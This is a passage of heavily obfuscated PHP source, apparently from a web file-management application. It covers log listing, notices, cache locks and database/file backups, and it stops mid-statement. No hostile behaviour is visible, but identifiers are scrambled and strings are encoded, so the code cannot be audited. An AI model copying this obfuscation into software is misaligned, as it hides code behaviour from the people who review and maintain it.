$ºôæá‰İ[$Õø—ş‘Í[33]] = array($Õø—ş‘Í[2432], $Õø—ş‘Í[2433]); } if (!empty($®è¤ÙÑø[$Õø—ş‘Í[2431]])) { $ºôæá‰İ[$Õø—ş‘Í[526]] = array($Õø—ş‘Í[459], "\x25{$®è¤ÙÑø[$Õø—ş‘Í[2431]]}\45"); } $€î‰ˆ¤ = $this->_makeOrder()->where($ºôæá‰İ)->selectPage(); if (empty($€î‰ˆ¤[$Õø—ş‘Í[445]])) { show_json(array(), !0, $€î‰ˆ¤[$Õø—ş‘Í[442]]); } $€î‰ˆ¤[$Õø—ş‘Í[445]] = $this->logList($€î‰ˆ¤[$Õø—ş‘Í[445]]); return $€î‰ˆ¤; } private function ipAddress(&$°çÉ–ª¤) { $ÄÍ…‡ùí =& $_SERVER[²Ö÷öõ]; if (!empty($°çÉ–ª¤[$ÄÍ…‡ùí[2431]])) { $É°îÚ¸ì = IpLocation::get($°çÉ–ª¤[$ÄÍ…‡ùí[2431]]); } else { $É°îÚ¸ì = LNG($ÄÍ…‡ùí[2434]); } $°çÉ–ª¤[$ÄÍ…‡ùí[2435]] = $É°îÚ¸ì; } private function descZipDownload($ôİ¯¬¼¶, &$±»‘ÊÚÚ) { $íêøêˆ =& $_SERVER[²Ö÷öõ]; if (!isset($ôİ¯¬¼¶[$íêøêˆ[2436]])) { return; } $•Ğ´¤Ã³ = json_decode($ôİ¯¬¼¶[$íêøêˆ[2436]], !0); foreach ($•Ğ´¤Ã³ as $­¬í´ıì) { try { $†é»–Õ = IO::infoFullSimple($­¬í´ıì[$íêøêˆ[87]]); } catch (Exception $ÍŒËßÂ–) { continue; } $ôİ¯¬¼¶[$íêøêˆ[87]] = $­¬í´ıì[$íêøêˆ[87]]; $±»‘ÊÚÚ[] = $ôİ¯¬¼¶[$íêøêˆ[193]] = $†é»–Õ[$íêøêˆ[193]]; $±»‘ÊÚÚ[] = $ôİ¯¬¼¶[$íêøêˆ[2213]] = $†é»–Õ[$íêøêˆ[192]]; break; } return $ôİ¯¬¼¶; } private function getSourceList(&$†ÊØ¿‘) { $ººãÔ˜· =& $_SERVER[²Ö÷öõ]; $øó•– = array(); foreach ($†ÊØ¿‘ as $Ÿ¿£ù•‘ => $¬‡ÓÛ…ß) { $Øø•®¼ˆ = json_decode($¬‡ÓÛ…ß[$ººãÔ˜·[526]], !0); if ($¬‡ÓÛ…ß[$ººãÔ˜·[33]] == $ººãÔ˜·[1953]) { $Øø•®¼ˆ = $this->descZipDownload($Øø•®¼ˆ, $øó•–); $†ÊØ¿‘[$Ÿ¿£ù•‘][$ººãÔ˜·[526]] = json_encode($Øø•®¼ˆ); continue; } if (strpos($¬‡ÓÛ…ß[$ººãÔ˜·[33]], $ººãÔ˜·[2215]) !== 0) { if (!isset($Øø•®¼ˆ[$ººãÔ˜·[87]]) || strpos($¬‡ÓÛ…ß[$ººãÔ˜·[33]], $ººãÔ˜·[2437]) !== 0) { continue; } try { $Öİšºß† = IO::infoFullSimple($Øø•®¼ˆ[$ººãÔ˜·[87]]); } catch (Exception $İš¬ïÔÍ) { continue; } $øó•–[] = $Øø•®¼ˆ[$ººãÔ˜·[193]] = $Öİšºß†[$ººãÔ˜·[193]]; $øó•–[] = $Øø•®¼ˆ[$ººãÔ˜·[2213]] = $Öİšºß†[$ººãÔ˜·[192]]; $†ÊØ¿‘[$Ÿ¿£ù•‘][$ººãÔ˜·[526]] = json_encode($Øø•®¼ˆ); continue; } $øó•–[] = $Øø•®¼ˆ[$ººãÔ˜·[193]]; $øó•–[] = $Øø•®¼ˆ[$ººãÔ˜·[2213]]; if ($Øø•®¼ˆ[$ººãÔ˜·[33]] == $ººãÔ˜·[620]) { $øó•–[] = $Øø•®¼ˆ[$ººãÔ˜·[526]][$ººãÔ˜·[1249]]; $øó•–[] = $Øø•®¼ˆ[$ººãÔ˜·[526]][$ººãÔ˜·[1250]]; } if ($Øø•®¼ˆ[$ººãÔ˜·[33]] == $ººãÔ˜·[2224]) { $øó•–[] = $Øø•®¼ˆ[$ººãÔ˜·[526]][$ººãÔ˜·[193]]; } } if (!$øó•–) { return array(); } return Model($ººãÔ˜·[907])->sourceListInfo($øó•–, !0); } private function logList($ıÏÄ¡ë­) { $“¸òÏŒÃ =& $_SERVER[²Ö÷öõ]; $¦¦‘¬²ó = array_to_keyvalue($ıÏÄ¡ë­, $“¸òÏŒÃ[12], $“¸òÏŒÃ[1780]); $÷¤¼—¾Ô = Model($“¸òÏŒÃ[598])->userListInfo(array_unique($¦¦‘¬²ó)); $¥Ê»¾‡ = $this->getSourceList($ıÏÄ¡ë­); $Âë¬§Ôö = $this->typeAll(); $¥Û¯Åå = array(); $şşÀÈ©› = array(); foreach ($ıÏÄ¡ë­ as $Ø‚Á´á => $şŠÈÆ¯à) { $ìŠ¹œŞ¬ = $şŠÈÆ¯à[$“¸òÏŒÃ[33]]; $Îáãİ×Š = isset($÷¤¼—¾Ô[$şŠÈÆ¯à[$“¸òÏŒÃ[1780]]]) ? $÷¤¼—¾Ô[$şŠÈÆ¯à[$“¸òÏŒÃ[1780]]] : !1; $ÎŞ¯îâø = strpos($ìŠ¹œŞ¬, $“¸òÏŒÃ[2438]) === 0 ? LNG($“¸òÏŒÃ[2439]) : LNG($“¸òÏŒÃ[2434]); $şŠÈÆ¯à[$“¸òÏŒÃ[32]] = isset($Îáãİ×Š[$“¸òÏŒÃ[32]]) ? $Îáãİ×Š[$“¸òÏŒÃ[32]] : LNG($“¸òÏŒÃ[2434]); $şŠÈÆ¯à[$“¸òÏŒÃ[2268]] = isset($Îáãİ×Š[$“¸òÏŒÃ[2268]]) ? $Îáãİ×Š[$“¸òÏŒÃ[2268]] : $“¸òÏŒÃ[12]; $şŠÈÆ¯à[$“¸òÏŒÃ[1667]] = isset($Âë¬§Ôö[$ìŠ¹œŞ¬]) ? $Âë¬§Ôö[$ìŠ¹œŞ¬] : $ÎŞ¯îâø; $şŠÈÆ¯à[$“¸òÏŒÃ[2156]] = $Îáãİ×Š; $Õ¤•ªì = json_decode($şŠÈÆ¯à[$“¸òÏŒÃ[526]], !0); $şŠÈÆ¯à[$“¸òÏŒÃ[2431]] = isset($Õ¤•ªì[$“¸òÏŒÃ[2431]]) ? $Õ¤•ªì[$“¸òÏŒÃ[2431]] : $“¸òÏŒÃ[12]; $şŠÈÆ¯à[$“¸òÏŒÃ[2435]] = IpLocation::get($şŠÈÆ¯à[$“¸òÏŒÃ[2431]]); if (strpos($ìŠ¹œŞ¬, $“¸òÏŒÃ[2215]) === 0 || isset($Õ¤•ªì[$“¸òÏŒÃ[2213]])) { $Õ¤•ªì[$“¸òÏŒÃ[90]] = $¥Ê»¾‡[$Õ¤•ªì[$“¸òÏŒÃ[193]]]; $Õ¤•ªì[$“¸òÏŒÃ[2229]] = $¥Ê»¾‡[$Õ¤•ªì[$“¸òÏŒÃ[2213]]]; if ($Õ¤•ªì[$“¸òÏŒÃ[33]] == $“¸òÏŒÃ[620]) { $Õ¤•ªì[$“¸òÏŒÃ[526]][$“¸òÏŒÃ[1249]] = $¥Ê»¾‡[$Õ¤•ªì[$“¸òÏŒÃ[526]][$“¸òÏŒÃ[1249]]]; $Õ¤•ªì[$“¸òÏŒÃ[526]][$“¸òÏŒÃ[1250]] = $¥Ê»¾‡[$Õ¤•ªì[$“¸òÏŒÃ[526]][$“¸òÏŒÃ[1250]]]; } if ($Õ¤•ªì[$“¸òÏŒÃ[33]] == $“¸òÏŒÃ[2224]) { $Õ¤•ªì[$“¸òÏŒÃ[526]][$“¸òÏŒÃ[193]] = $¥Ê»¾‡[$Õ¤•ªì[$“¸òÏŒÃ[526]][$“¸òÏŒÃ[193]]]; } if ($Õ¤•ªì[$“¸òÏŒÃ[33]] == $“¸òÏŒÃ[1948]) { $Õ¤•ªì[$“¸òÏŒÃ[2229]] = $Õ¤•ªì[$“¸òÏŒÃ[90]]; $Õ¤•ªì[$“¸òÏŒÃ[2213]] = $Õ¤•ªì[$“¸òÏŒÃ[2229]][$“¸òÏŒÃ[193]]; $Õ¤•ªì[$“¸òÏŒÃ[90]] = !1; $Õ¤•ªì[$“¸òÏŒÃ[193]] = $“¸òÏŒÃ[12]; } $Åßœ­ï = array($“¸òÏŒÃ[1948], $“¸òÏŒÃ[2211]); if (!in_array($Õ¤•ªì[$“¸òÏŒÃ[33]], $Åßœ­ï)) { if ($Õ¤•ªì[$“¸òÏŒÃ[90]] && $Õ¤•ªì[$“¸òÏŒÃ[90]][$“¸òÏŒÃ[190]] == $“¸òÏŒÃ[191]) { $şşÀÈ©›[] = $şŠÈÆ¯à[$“¸òÏŒÃ[475]]; unset($ıÏÄ¡ë­[$Ø‚Á´á]); continue; } if ($Õ¤•ªì[$“¸òÏŒÃ[2229]] && $Õ¤•ªì[$“¸òÏŒÃ[2229]][$“¸òÏŒÃ[190]] == $“¸òÏŒÃ[191]) { $şşÀÈ©›[] = $şŠÈÆ¯à[$“¸òÏŒÃ[475]]; unset($ıÏÄ¡ë­[$Ø‚Á´á]); continue; } } } $şŠÈÆ¯à[$“¸òÏŒÃ[526]] = $Õ¤•ªì; unset($şŠÈÆ¯à[$“¸òÏŒÃ[2440]]); $¥Û¯Åå[] = $şŠÈÆ¯à; } $this->clearSystemPathLog($şşÀÈ©›); return $¥Û¯Åå; } private function clearSystemPathLog($§µË‰áÚ) { $—±±Û =& $_SERVER[²Ö÷öõ]; if (count($§µË‰áÚ) == 0) { return; } $ŸîÀ¾ûö = array($—±±Û[475] => array($—±±Û[7], array_unique($§µË‰áÚ))); $this->where($ŸîÀ¾ûö)->delete(); } public function deviceList($¨‘íÓÈ, $É£ÔŸÖü = 0) { $¹äİÏ– =& $_SERVER[²Ö÷öõ]; $Å÷Ï½¶Ù = array($¹äİÏ–[1780] => $¨‘íÓÈ, $¹äİÏ–[231] => array($¹äİÏ–[1100], $É£ÔŸÖü), $¹äİÏ–[33] => $¹äİÏ–[1922]); $ªÇÏåİÌ = array(); $ÇÎ¥üô = $this->field($¹äİÏ–[2441])->where($Å÷Ï½¶Ù)->order($¹äİÏ–[2227])->limit(50)->select(); foreach ($ÇÎ¥üô as $ƒ²¶·¯€ => $–î´Ûı) { if ($ƒ²¶·¯€ > 0 && abs($–î´Ûı[$¹äİÏ–[231]] - $ÇÎ¥üô[$ƒ²¶·¯€ - 1][$¹äİÏ–[231]]) < 5) { continue; } $ÍäÄÍµå = json_decode($–î´Ûı[$¹äİÏ–[526]], !0); $–î´Ûı[$¹äİÏ–[2431]] = isset($ÍäÄÍµå[$¹äİÏ–[2431]]) ? $ÍäÄÍµå[$¹äİÏ–[2431]] : $¹äİÏ–[12]; unset($ÍäÄÍµå[$¹äİÏ–[2431]]); $‘üÖ•¥ = $this->deviceType($ÍäÄÍµå[$¹äİÏ–[2216]]); if (isset($ªÇÏåİÌ[$‘üÖ•¥])) { continue; } $–î´Ûı[$¹äİÏ–[2435]] = IpLocation::get($–î´Ûı[$¹äİÏ–[2431]]); $–î´Ûı[$¹äİÏ–[526]] = $ÍäÄÍµå; $ªÇÏåİÌ[$‘üÖ•¥] = $–î´Ûı; } return array_values($ªÇÏåİÌ); } public function deviceType($åÊÒù¯ó) { return $åÊÒù¯ó; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\156\157\164\x69\143\x65\x4c\x69\163\x74"; public $field = array("\156\141\155\145", "\x63\157\x6e\164\x65\156\x74", "\x61\x75\x74\x68", "\x6d\x6f\144\145", "\x74\x69\155\x65", "\x74\x79\160\x65", "\154\145\x76\x65\x6c", "\145\x6e\141\x62\154\x65", "\163\157\x72\x74"); public function listData($Ú—åÁÔ = false, $Ãˆæ‹Û¥ = "\163\157\162\x74", $ó£´ñòû = false) { return parent::listData($Ú—åÁÔ, $Ãˆæ‹Û¥, $ó£´ñòû); } public function add($ùı§ŒÎÓ) { $èÌİóì =& $_SERVER[²Ö÷öõ]; $¤£üş’Œ = time(); if ($ùı§ŒÎÓ[$èÌİóì[16]] == $èÌİóì[2442]) { $¤£üş’Œ = strtotime($ùı§ŒÎÓ[$èÌİóì[206]]); } $ùı§ŒÎÓ[$èÌİóì[206]] = $¤£üş’Œ; return parent::insert($ùı§ŒÎÓ); } public function update($ÑŸÈ··÷, $ÕŠĞ“ïí) { $œÅê‡‡ˆ =& $_SERVER[²Ö÷öõ]; $‚•ë«ë = $this->listData($ÑŸÈ··÷); if (!$‚•ë«ë) { return !1; } $çÁİ‹¬ˆ = time(); if ($ÕŠĞ“ïí[$œÅê‡‡ˆ[16]] == $œÅê‡‡ˆ[2442]) { $çÁİ‹¬ˆ = strtotime($ÕŠĞ“ïí[$œÅê‡‡ˆ[206]]); } $ÕŠĞ“ïí[$œÅê‡‡ˆ[206]] = $çÁİ‹¬ˆ; return parent::update($ÑŸÈ··÷, $ÕŠĞ“ïí); } public function remove($äÅ½Éşœ) { $Êõóü’ = $this->listData($äÅ½Éşœ); if (!$Êõóü’ || $Êõóü’[$_SERVER[²Ö÷öõ][191]]) { return !1; } return parent::remove($äÅ½Éşœ); } public function sort($ª»ò­£—, $ô“û˜ó’) { return parent::update($ª»ò­£—, $ô“û˜ó’); } public function enable($©µÇ’ı, $É€È¥›) { return parent::update($©µÇ’ı, array($_SERVER[²Ö÷öõ][2443] => $É€È¥›)); } private function initUserOption() { $¢ŸÂí =& $_SERVER[²Ö÷öõ]; $this->optionType = $¢ŸÂí[2444]; $this->modelType = $¢ŸÂí[2445]; $this->field = array($¢ŸÂí[2446], $¢ŸÂí[32], $¢ŸÂí[206], $¢ŸÂí[33], $¢ŸÂí[2447], $¢ŸÂí[833], $¢ŸÂí[226]); } public function userNoticeGet($ š¼ò¥ú = false) { $this->initUserOption(); return parent::listData($ š¼ò¥ú, $_SERVER[²Ö÷öõ][475], !0); } public function userNoticeAdd($¬ÊŞì®Ï) { $ùÙü˜ª… =& $_SERVER[²Ö÷öõ]; $this->initUserOption(); $¸Àş ¤ = $this->findByKey($ùÙü˜ª…[2446], $¬ÊŞì®Ï[$ùÙü˜ª…[475]]); if ($¸Àş ¤) { return !0; } $Ö¿‹ºŠ = array($ùÙü˜ª…[2446] => $¬ÊŞì®Ï[$ùÙü˜ª…[475]], $ùÙü˜ª…[32] => $¬ÊŞì®Ï[$ùÙü˜ª…[32]], $ùÙü˜ª…[206] => $¬ÊŞì®Ï[$ùÙü˜ª…[206]], $ùÙü˜ª…[33] => isset($¬ÊŞì®Ï[$ùÙü˜ª…[33]]) ? $¬ÊŞì®Ï[$ùÙü˜ª…[33]] : 1, $ùÙü˜ª…[2447] => isset($¬ÊŞì®Ï[$ùÙü˜ª…[2447]]) ? $¬ÊŞì®Ï[$ùÙü˜ª…[2447]] : 0, $ùÙü˜ª…[833] => 0, $ùÙü˜ª…[226] => 0); return parent::insert($Ö¿‹ºŠ); } public function userNoticeEdit($À¡Ó£, $Æˆ“š¶) { $this->initUserOption(); return parent::update($À¡Ó£, $Æˆ“š¶); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\164\x65\155\x5f\157\160\x74\151\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\x75", "\x72\x6f\154\x65", "\x72\157\x6c\145\107\x72\157\165\160", "\x72\145\147\151\163\164", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Õ‘µ´ªì) { return "\123\x79\163\164\145\x6d\117\160\164\151\157\156\137{$Õ‘µ´ªì}"; } protected function optionDefault($ÕÛ¬’¹ã = '') { $ÄéÓğ‚‘ =& $_SERVER[²Ö÷öõ]; if ($ÕÛ¬’¹ã == $ÄéÓğ‚‘[12]) { return $GLOBALS[$ÄéÓğ‚‘[6]][$ÄéÓğ‚‘[457]]; } } } goto C‚¯£Ö¿‰ˆ; fÖ±Ñ†î§: define($_SERVER[²Ö÷öõ][317], 3); define($_SERVER[²Ö÷öõ][318], 1); define($_SERVER[²Ö÷öõ][319], 0); goto CÉò„•÷Õá; A§¿±–È è: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÑÖ‰¨¥½ =& $_SERVER[²Ö÷öõ]; $èÕ¯—”­ = $GLOBALS[$ÑÖ‰¨¥½[6]][$ÑÖ‰¨¥½[425]]; self::$cachePath = $èÕ¯—”­[$ÑÖ‰¨¥½[230]][$ÑÖ‰¨¥½[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($…ÄÜÆŒ, $ı×Ë¹†­ = 0) { $Ùä—¹Ë– =& $_SERVER[²Ö÷öõ]; $àãÌë¬â = microtime(!0); $“š·éèÓ = $àãÌë¬â + $ı×Ë¹†­ + 0.0001; $Ğš’˜Â = rtrim(self::$cachePath, $Ùä—¹Ë–[8]) . $Ùä—¹Ë–[946] . md5($…ÄÜÆŒ) . $Ùä—¹Ë–[943]; if (file_exists($Ğš’˜Â) && filemtime($Ğš’˜Â) && filemtime($Ğš’˜Â) < time() - 10) { @unlink($Ğš’˜Â); } do { if (file_exists($Ğš’˜Â)) { cacheLockWait(); continue; } $£”•ÙËè = fopen($Ğš’˜Â, $Ùä—¹Ë–[947]); if (!$£”•ÙËè) { return !1; } $İÕÀµ¥¬ = flock($£”•ÙËè, LOCK_EX | LOCK_NB); self::$caches[$…ÄÜÆŒ] = array($Ùä—¹Ë–[948] => $£”•ÙËè, $Ùä—¹Ë–[230] => $Ğš’˜Â); fwrite($£”•ÙËè, $“š·éèÓ); clearstatcache(); if ($£”•ÙËè && $İÕÀµ¥¬) { return !0; } cacheLockWait(); } while (microtime(!0) < $“š·éèÓ); $this->unlock($…ÄÜÆŒ); return !1; } public function lockGet($Ó‘Êí­ú) { $ŒÒşƒÔœ =& $_SERVER[²Ö÷öõ]; $ƒâØ’ù = rtrim(self::$cachePath, $ŒÒşƒÔœ[8]) . $ŒÒşƒÔœ[946] . md5($Ó‘Êí­ú) . $ŒÒşƒÔœ[943]; return file_exists($ƒâØ’ù); } public function unlock($æŠ™Í²Ã) { $ßß–æ¹š =& $_SERVER[²Ö÷öõ]; $®•ß¯õÂ = self::$caches[$æŠ™Í²Ã]; if (!$®•ß¯õÂ) { return; } @flock($®•ß¯õÂ[$ßß–æ¹š[948]], LOCK_UN); @fclose($®•ß¯õÂ[$ßß–æ¹š[948]]); @unlink($®•ß¯õÂ[$ßß–æ¹š[230]]); unset(self::$caches[$æŠ™Í²Ã]); } } class CacheLockRedis { public function lock($ˆ¾ßíœŒ, $ ‡ß– = 10) { $Ñ ¾øóÄ = Cache::init(); $ßòƒö¨² = microtime(!0) + $ ‡ß–; while (microtime(!0) < $ßòƒö¨²) { $é‘€Š‚Š = $Ñ ¾øóÄ->get($ˆ¾ßíœŒ); if (!$é‘€Š‚Š) { $åó¹ä‚¸ = $Ñ ¾øóÄ->setLock($ˆ¾ßíœŒ, $ßòƒö¨², $ ‡ß–); if ($åó¹ä‚¸) { return !0; } } else { if ($é‘€Š‚Š < microtime(!0)) { $Ñ ¾øóÄ->set($ˆ¾ßíœŒ, $ßòƒö¨², $ ‡ß– * 2); if ($Ñ ¾øóÄ->get($ˆ¾ßíœŒ) === $é‘€Š‚Š) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ã£ğœ‡) { return Cache::init()->get($Ã£ğœ‡); } public function unlock($ŞŒë•ƒ) { return Cache::init()->remove($ŞŒë•ƒ); } } goto B¨Š››âå; aœ§îœõ¡Ô: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Âƒ›Ÿ”û =& $_SERVER[²Ö÷öõ]; $ú‡û‰µ = Backup::get(); self::$io = $ú‡û‰µ[$Âƒ›Ÿ”û[835]]; self::$name = $ú‡û‰µ[$Âƒ›Ÿ”û[32]]; $¯¬èÓƒã = new DbManage(); $½ãÏ² í = $¯¬èÓƒã->dbType(); $·™ÉãĞÆ = array($Âƒ›Ÿ”û[860] => $½ãÏ² í, $Âƒ›Ÿ”û[861] => time()); Backup::set($·™ÉãĞÆ); $ŒàË© = $this->tmpFilesPath() . $Âƒ›Ÿ”û[862] . self::$name . $Âƒ›Ÿ”û[8]; del_dir($ŒàË©); mk_dir($ŒàË©); $ƒ°–« = $ßíßÂ’õ = 0; try { $ä¹ıÇ“İ = $¯¬èÓƒã->db()->getTables(); } catch (Exception $ƒÉò™Úı) { return !1; } $ä¹ıÇ“İ = array_diff($ä¹ıÇ“İ, array($Âƒ›Ÿ”û[863], $Âƒ›Ÿ”û[864])); foreach ($ä¹ıÇ“İ as $ÔŠá¯¦³) { $ƒ°–« += $¯¬èÓƒã->model($ÔŠá¯¦³)->count(); } $¤øãê¸ = new Task($Âƒ›Ÿ”û[865], $Âƒ›Ÿ”û[866], $ƒ°–«, LNG($Âƒ›Ÿ”û[867]) . $Âƒ›Ÿ”û[868] . LNG($Âƒ›Ÿ”û[869])); $GLOBALS[$Âƒ›Ÿ”û[870]] = self::$name; foreach ($ä¹ıÇ“İ as $ÔŠá¯¦³) { $¼³ÀıÒ¦ = $ŒàË© . $ÔŠá¯¦³ . $Âƒ›Ÿ”û[871]; $Øñ™ñâ÷ = null; if ($ÔŠá¯¦³ == $Âƒ›Ÿ”û[872] && (!isset($ú‡û‰µ[$Âƒ›Ÿ”û[171]]) || $ú‡û‰µ[$Âƒ›Ÿ”û[171]] == $Âƒ›Ÿ”û[228])) { $Øñ™ñâ÷ = self::$io; } $ßíßÂ’õ += $¯¬èÓƒã->sqlFromDb($ÔŠá¯¦³, $¼³ÀıÒ¦, $¤øãê¸, $Øñ™ñâ÷); } unset($GLOBALS[$Âƒ›Ÿ”û[870]]); $¤øãê¸->end(); if ($ßíßÂ’õ > $ƒ°–«) { $ƒ°–« = $ßíßÂ’õ; } $·™ÉãĞÆ = array($Âƒ›Ÿ”û[860] => $½ãÏ² í, $Âƒ›Ÿ”û[856] => 1, $Âƒ›Ÿ”û[873] => $ƒ°–«, $Âƒ›Ÿ”û[874] => $ßíßÂ’õ, $Âƒ›Ÿ”û[875] => time()); Backup::set($·™ÉãĞÆ); if ($ƒ°–« - $ßíßÂ’õ > 0) { $ŠÉ˜´Âã = $Âƒ›Ÿ”û[876]; if (!stristr(I18n::getType(), $Âƒ›Ÿ”û[877])) { $ŠÉ˜´Âã = $Âƒ›Ÿ”û[878]; } write_log(array($ŠÉ˜´Âã, $·™ÉãĞÆ), $Âƒ›Ÿ”û[866]); return !1; } return !0; } private function tmpFilesPath() { $ÕŸ¤°×“ =& $_SERVER[²Ö÷öõ]; $«ÁĞ³éÛ = TEMP_FILES; if ($GLOBALS[$ÕŸ¤°×“[6]][$ÕŸ¤°×“[92]][$ÕŸ¤°×“[879]]) { $«ÁĞ³éÛ = $GLOBALS[$ÕŸ¤°×“[6]][$ÕŸ¤°×“[92]][$ÕŸ¤°×“[879]]; if (!mk_dir($«ÁĞ³éÛ) || !is_writable($«ÁĞ³éÛ) || !IO::mkfile($«ÁĞ³éÛ . $ÕŸ¤°×“[880])) { $«ÁĞ³éÛ = TEMP_FILES; } } return $«ÁĞ³éÛ; } } class BackupDbFile { public function __construct() { } public function index() { $×»¸ª¡´ =& $_SERVER[²Ö÷öõ]; $ôªäµï… = Backup::get(); $”™¯–Á = $ôªäµï…[$×»¸ª¡´[32]]; $Ù¾òñã­ = $this->tmpFilesPath() . "\x62\141\x63\x6b\165\x70\137{$”™¯–Á}\x2f"; $ì‡¯¤¨ó = $this->backupPath($ôªäµï…); if (!($ì‡¯¤¨ó = IO::mkdir($ì‡¯¤¨ó))) { return !1; } $“÷»‘šç = IO::listPath($Ù¾òñã­); $ëÙÉ£—÷ = isset($“÷»‘šç[$×»¸ª¡´[86]]) ? $“÷»‘šç[$×»¸ª¡´[86]] : array(); $ê¡©³ßì = array_sum(array_column($ëÙÉ£—÷, $×»¸ª¡´[79])); if (!$ê¡©³ßì) { return !1; } $ÁÔ‹ëí  = array($×»¸ª¡´[881] => $ê¡©³ßì, $×»¸ª¡´[882] => time()); Backup::set($ÁÔ‹ëí ); $ÈæÇÕæ‘ = new TaskFileTransfer($×»¸ª¡´[883], $×»¸ª¡´[866], count($ëÙÉ£—÷), LNG($×»¸ª¡´[867]) . $×»¸ª¡´[462] . LNG($×»¸ª¡´[869]) . $×»¸ª¡´[884]); $ÈæÇÕæ‘->task[$×»¸ª¡´[846]] = $ê¡©³ßì; foreach ($“÷»‘šç[$×»¸ª¡´[86]] as $šĞ‘À¨¦) { $Õ‡ÇÔ–â = IO::move($šĞ‘À¨¦[$×»¸ª¡´[87]], $ì‡¯¤¨ó); if (!$Õ‡ÇÔ–â) { $ÈæÇÕæ‘->end(); $ÅÅŒÏÑÅ = IO::getLastError($×»¸ª¡´[885] . $šĞ‘À¨¦[$×»¸ª¡´[87]] . $×»¸ª¡´[886] . $ì‡¯¤¨ó . $×»¸ª¡´[178]); write_log($ÅÅŒÏÑÅ, $×»¸ª¡´[866]); return !1; } } $˜Ò‰¶ıš = new DbManage(); $±á¦çÃê = $˜Ò‰¶ıš->getSqlFile(); if (!$±á¦çÃê[$×»¸ª¡´[887]] || !$±á¦çÃê[$×»¸ª¡´[13]]) { return !1; } IO::move($±á¦çÃê[$×»¸ª¡´[887]], $ì‡¯¤¨ó); IO::move($±á¦çÃê[$×»¸ª¡´[13]], $ì‡¯¤¨ó); $ÈæÇÕæ‘->end(); $ÁÔ‹ëí  = array($×»¸ª¡´[888] => $ê¡©³ßì, $×»¸ª¡´[889] => time()); Backup::set($ÁÔ‹ëí ); return !0; } private function backupPath($ÜáÏâé¶) { $æä¢å¦¼ =& $_SERVER[²Ö÷öõ]; $–ÂŒšœ = $ÜáÏâé¶[$æä¢å¦¼[32]]; $ ¦×ŸØ” = Model($æä¢å¦¼[853])->get($æä¢å¦¼[854]); $á’ìßü = substr(md5($æä¢å¦¼[855] . $ ¦×ŸØ” . $–ÂŒšœ), 0, 8); return "\173\151\x6f\x3a{$ÜáÏâé¶[$æä¢å¦¼[835]]}\175\57\144\x61\164\x61\x62\x61\163\145\57\x62\141\143\x6b\x75\x70\x2f" . $–ÂŒšœ . $æä¢å¦¼[11] . $á’ìßü; } private function tmpFilesPath() { $±ç©©Š’ =& $_SERVER[²Ö÷öõ]; $Îëà™Ç‰ = TEMP_FILES; if ($GLOBALS[$±ç©©Š’[6]][$±ç©©Š’[92]][$±ç©©Š’[879]]) { $Îëà™Ç‰ = $GLOBALS[$±ç©©Š’[6]][$±ç©©Š’[92]][$±ç©©Š’[879]]; if (!mk_dir($Îëà™Ç‰) || !is_writable($Îëà™Ç‰) || !IO::mkfile($Îëà™Ç‰ . $±ç©©Š’[880])) { $Îëà™Ç‰ = TEMP_FILES; } } return $Îëà™Ç‰; } } class BackupFile { public function __construct() { } public function index() { $…†¿¼˜ñ = Backup::get(); $¬ó³ÈåÙ = $…†¿¼˜ñ[$_SERVER[²Ö÷öõ][369]][$_SERVER[²Ö÷öõ][230]][$_SERVER[²Ö÷öõ][541]]; $ÌÕî¨Ï½ = array($_SERVER[²Ö÷öõ][542] => array($_SERVER[²Ö÷öõ][890], $¬ó³ÈåÙ), $_SERVER[²Ö÷öõ][891] => array($_SERVER[²Ö÷öõ][407], $…†¿¼˜ñ[$_SERVER[²Ö÷öõ][835]])); $ÎÆ¶¼¼Î = (int) Model($_SERVER[²Ö÷öõ][872])->where($ÌÕî¨Ï½)->count($_SERVER[²Ö÷öõ][541]); $³Ú¤»•ø = (int) Model($_SERVER[²Ö÷öõ][872])->where($ÌÕî¨Ï½)->sum($_SERVER[²Ö÷öõ][79]); $àúÕ‰ñ¯ = new TaskFileTransfer($_SERVER[²Ö÷öõ][892], $_SERVER[²Ö÷öõ][866], $ÎÆ¶¼¼Î, LNG($_SERVER[²Ö÷öõ][867]) . $_SERVER[²Ö÷öõ][868] . LNG($_SERVER[²Ö÷öõ][893])); $àúÕ‰ñ¯->task[$_SERVER[²Ö÷öõ][846]] = $³Ú¤»•ø; $´‚…šš = array($_SERVER[²Ö÷öõ][894] => $ÎÆ¶¼¼Î, $_SERVER[²Ö÷öõ][895] => $³Ú¤»•ø, $_SERVER[²Ö÷öõ][896] => time()); Backup::set($´‚…šš); $ø¢¯Á€è = !0; $óö†ÒÂû = $this->storeIds(); $‘ôì±‹Ğ = 1; $‹¥û’Ùæ = 1000; $Ø¶ş¶¨Û = $Ú§Ø³ûŠ = 0; $­™œ‰Óà = array(); $º¦ƒŠéÊ = $Î«ÏŠÁ« = 0; do { $½¹¶³øÉ = $_SERVER[²Ö÷öõ][897]; $¥Òéšıá = Model($_SERVER[²Ö÷öõ][872])->where($ÌÕî¨Ï½)->field($½¹¶³øÉ)->order($_SERVER[²Ö÷öõ][898])->selectPage($‹¥û’Ùæ, $‘ôì±‹Ğ); $…ô· Ÿ™ = !empty($¥Òéšıá[$_SERVER[²Ö÷öõ][445]]) ? $¥Òéšıá[$_SERVER[²Ö÷öõ][445]] : array(); foreach ($…ô· Ÿ™ as $óÌ‘Óàø) { if (!$this->_fileExist($óÌ‘Óàø, $­™œ‰Óà, $óö†ÒÂû)) { write_log("\146\x69\154\145\40\x6e\157\x74\40\145\x78\151\x73\164\56\146\151\x6c\145\x49\x44\x3a{$óÌ‘Óàø[$_SERVER[²Ö÷öõ][541]]}\x2c\x20\160\x61\x74\150\72{$óÌ‘Óàø[$_SERVER[²Ö÷öõ][87]]}", $_SERVER[²Ö÷öõ][899]); continue; } $Ã¾ûá€Ê = $óÌ‘Óàø[$_SERVER[²Ö÷öõ][87]]; $ö÷ï‰ø™ = "\x7b\151\157\72{$…†¿¼˜ñ[$_SERVER[²Ö÷öõ][835]]}\175" . substr($Ã¾ûá€Ê, 